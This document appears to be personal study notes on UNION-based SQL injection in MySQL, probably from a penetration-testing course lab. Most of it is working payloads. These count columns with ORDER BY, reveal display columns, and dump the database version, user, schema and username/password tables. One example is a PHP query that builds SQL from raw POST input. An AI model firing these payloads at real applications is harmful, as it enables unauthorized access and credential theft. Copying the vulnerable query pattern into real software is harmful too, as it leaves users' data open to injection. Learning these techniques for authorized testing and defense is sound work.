## Union Cause
The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases. 

```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;
```

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
## Un-even Columns
Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```
```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```
```shell-session
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
```

# UNION injection
```
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```
To know number of columns increase the number until we get error:
```
' ORDER BY 1-- //
```
Display Columns:
```
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
```

```
%' UNION SELECT database(), user(), @@version, null, null -- //
```
```
' UNION SELECT null, null, database(), user(), @@version  -- //
```
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
```
' UNION SELECT null, username, password, description, null FROM users -- //
```


#### Using ORDER BY
```sql
' order by 1-- -
```
Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--).
```sql
' order by 2-- -
```
#### Using UNION
```sql
cn' UNION select 1,2,3-- -
```
```sql
cn' UNION select 1,2,3,4-- -
```

## Location of Injection
```sql
cn' UNION select 1,@@version,3,4-- -
```
